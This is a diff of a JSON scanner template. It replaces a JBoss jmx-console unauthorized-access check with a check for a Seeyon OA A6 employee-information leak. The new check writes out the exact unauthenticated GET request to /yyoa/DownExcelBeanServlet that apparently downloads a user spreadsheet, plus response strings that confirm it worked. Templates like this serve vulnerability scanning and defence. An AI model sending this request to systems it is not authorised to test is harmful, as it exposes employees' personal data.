@@ -1,13 +1,13 @@
 {
-    "Name": "jboss-unauth",
-    "Description": "jboss-unauth, unauthorized access vulnerability",
-    "Product": "jboss",
+    "Name": "Seeyon OA A6 Employee Info Leak",
+    "Description": "Seeyon OA A6 Employee Info Leak",
+    "Product": "Seeyon OA",
     "author": "chumeng",
     "Request":[
         {
         "Method": "GET",
         "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
-        "Uri":"/jmx-console/",
+        "Uri":"/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0",
         "Port":"",
         "Data":"",
         "Follow_redirects":"false",
@@ -18,11 +18,11 @@
                 {
                 "Operation": "contains", 
                 "Key":"",
-                "Value": "jboss.management.local"
+                "Value": "[Content_Types].xml"
                 }, {
                     "Operation": "contains", 
                     "Key":"",
-                    "Value": "jboss.web"
+                    "Value": "Excel.Sheet.xml"
                     },
                  {
                 "Operation": "code", 
